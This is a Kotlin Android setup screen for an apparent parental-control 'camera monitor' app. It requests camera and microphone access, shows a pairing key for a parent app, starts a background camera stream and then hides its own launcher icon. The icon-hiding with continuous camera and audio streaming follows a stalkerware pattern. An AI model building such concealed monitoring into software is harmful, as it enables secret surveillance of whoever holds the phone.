package com.parentalcontrol.kidcamera

import android.Manifest
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import java.util.UUID

/**
 * One-time setup activity for the Camera-Only kid app.
 *
 * Much simpler than kid-monitor: no MediaProjection dialog.
 * Flow:
 *  1. Request camera + notification permissions
 *  2. Show pairing key (same format as kid-monitor, so parent app works)
 *  3. Start CameraStreamService
 *  4. Hide icon
 */
class SetupActivity : AppCompatActivity() {

    private lateinit var btnAction: Button
    private lateinit var tvStatus: TextView
    private lateinit var progressBar: ProgressBar

    private val prefs by lazy { getSharedPreferences(PREFS_NAME, MODE_PRIVATE) }

    // ─── Permission Launchers ─────────────────────────────────────────
    private val notifPermLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { /* proceed regardless */ requestCameraPermission() }

    private val cameraPermLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { granted ->
        if (granted) {
            requestAudioPermission()
        } else {
            tvStatus.text = "Camera permission required"
            btnAction.visibility = View.VISIBLE
            btnAction.text = "Grant Camera"
            btnAction.setOnClickListener { requestCameraPermission() }
        }
    }

    private val audioPermLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { /* proceed regardless — mic is optional */ finishSetup() }

    // ─── Lifecycle ────────────────────────────────────────────────────
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_setup)

        btnAction   = findViewById(R.id.btnAction)
        tvStatus    = findViewById(R.id.tvStatus)
        progressBar = findViewById(R.id.progressBar)

        // Re-launch: setup already done → ensure service running, then finish
        if (prefs.getBoolean(KEY_SETUP_DONE, false)) {
            val pairingKey = prefs.getString(KEY_PAIRING_KEY, null)
            if (!prefs.getBoolean(KEY_KEY_SHOWN, false) && pairingKey != null) {
                showPairingKeyDialog(pairingKey)
            } else {
                CameraStreamService.start(this)
                finish()
            }
            return
        }

        startSetup()
    }

    private fun startSetup() {
        setStatus("Generating device ID…", 10)

        // Generate device ID and pairing key
        val deviceId = prefs.getString(KEY_DEVICE_ID, null) ?: UUID.randomUUID().toString().also {
            prefs.edit().putString(KEY_DEVICE_ID, it).apply()
        }
        val pairingKey = prefs.getString(KEY_PAIRING_KEY, null) ?: generatePairingKey().also {
            prefs.edit().putString(KEY_PAIRING_KEY, it).apply()
        }

        setStatus("Requesting permissions…", 30)

        // Request notification permission first (Android 13+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
            != PackageManager.PERMISSION_GRANTED) {
            notifPermLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
        } else {
            requestCameraPermission()
        }
    }

    private fun requestCameraPermission() {
        setStatus("Requesting camera permission…", 50)
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED) {
            cameraPermLauncher.launch(Manifest.permission.CAMERA)
        } else {
            requestAudioPermission()
        }
    }

    private fun requestAudioPermission() {
        setStatus("Requesting microphone permission…", 70)
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED) {
            audioPermLauncher.launch(Manifest.permission.RECORD_AUDIO)
        } else {
            finishSetup()
        }
    }

    private fun finishSetup() {
        setStatus("Setup complete!", 100)

        // Request battery optimization exemption
        requestBatteryOptimizationExemption()

        // Mark setup done
        prefs.edit().putBoolean(KEY_SETUP_DONE, true).apply()

        // Show pairing key dialog
        val pairingKey = prefs.getString(KEY_PAIRING_KEY, "") ?: ""
        showPairingKeyDialog(pairingKey)
    }

    private fun showPairingKeyDialog(pairingKey: String) {
        AlertDialog.Builder(this)
            .setTitle("📷 Camera Monitor Ready")
            .setMessage(
                "Your device pairing key:\n\n" +
                "🔑  $pairingKey\n\n" +
                "Enter this key in the Parent App to view this device's camera.\n\n" +
                "Camera-Only mode: the parent can view camera and listen via mic.\n" +
                "No screen sharing."
            )
            .setCancelable(false)
            .setPositiveButton("Done") { _, _ ->
                onKeyDialogDone(pairingKey)
            }
            .setNeutralButton("Copy Key") { _, _ ->
                copyKey(pairingKey)
                onKeyDialogDone(pairingKey)
            }
            .show()
    }

    private fun onKeyDialogDone(pairingKey: String) {
        prefs.edit().putBoolean(KEY_KEY_SHOWN, true).apply()
        CameraStreamService.start(this)
        hideAppIcon()
        finish()
    }

    private fun requestBatteryOptimizationExemption() {
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            }
        } catch (e: Exception) {
            // Ignore — not all devices support this intent
        }
    }

    private fun copyKey(key: String) {
        val cm = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
        cm.setPrimaryClip(ClipData.newPlainText("Pairing Key", key))
        Toast.makeText(this, "✅ Key copied: $key", Toast.LENGTH_LONG).show()
    }

    private fun hideAppIcon() {
        packageManager.setComponentEnabledSetting(
            android.content.ComponentName(this, SetupActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    private fun setStatus(msg: String, progress: Int) {
        tvStatus.text = msg
        progressBar.progress = progress
        btnAction.visibility = View.GONE
    }

    private fun generatePairingKey(): String {
        val chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        return (1..6).map { chars.random() }.joinToString("")
    }

    companion object {
        const val PREFS_NAME          = "monitor_prefs"   // Same as kid-monitor so parent key works
        const val PREFS_NAME_KEY      = "pairing_key"     // Alias for clarity in CameraStreamService
        const val KEY_SETUP_DONE      = "setup_done"
        const val KEY_DEVICE_ID       = "device_id"
        const val KEY_PAIRING_KEY     = "pairing_key"
        const val KEY_KEY_SHOWN       = "pairing_key_shown"
    }
}
